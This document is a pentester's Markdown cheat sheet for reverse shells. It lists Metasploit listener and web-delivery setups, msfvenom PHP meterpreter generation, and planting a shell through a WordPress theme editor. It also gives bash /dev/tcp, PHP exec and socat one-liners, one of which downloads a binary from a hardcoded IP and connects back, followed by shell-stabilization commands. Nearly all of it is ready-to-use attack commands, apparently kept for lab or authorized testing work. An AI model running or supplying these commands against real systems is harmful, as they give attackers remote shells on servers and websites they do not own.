# Reverse Shell
## Metasploit
### msfconsole
- Get meterpreter session with SSH login
```bash
use auxiliary/scanner/ssh/ssh_login
set rhosts 0.0.0.0
set username user
set password pass
run
sessions -u 1
- Meterpreter listener
```bash
$ msfconsole
use exploit/multi/handler
set lhost 0.0.0.0
set lport 4444
set payload linux/x64/meterpreter/reverse_tcp
```
- PHP Web Delivery
```bash
$ msfconsole
use exploit/multi/script/web_delivery
set payload php/meterpreter/reverse_tcp
set target PHP
set lhost tun0
run
```

### msfvenom payload
- PHP Meterpreter
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<local ip address> LPORT=<local listening port> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## Payload
___
### PHP
- Get reverse shell from Wordpress admin dashboard using themes edition
```
Login as admin, and edit a theme's php file.
Replace content with Pentest Monkey's php-reverse-shell
Browse file : http://hostname/wordpress/wp-content/themes/themename/file.php
```

- Basic PHP command line to open a shell
```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4445 0>&1'");
```

## OS Command
- Bash command to open shell
```sh
bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
```

- Socat Shell
```sh
wget -q 10.6.77.211/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.6.77.211:443
```

# Stabilizing shell
___
- Upgrade shell to bash/pty

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
export SHELL=bash
export TERM=xterm-256color
stty rows 50 columns 190
```

- If Ctrl-Cmd are needed (doesnt work well with meterpreter shell)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then Ctrl-Z to background revshell
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
export TERM=xterm-256color
stty rows 50 columns 190
```

## Links
___
### Guides
- https://www.hackingarticles.in/wordpress-reverse-shell/
- https://github.com/pentestmonkey/php-reverse-shell
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://netsec.ws/?p=331
- https://gtfobins.github.io/

### Writeups
- 
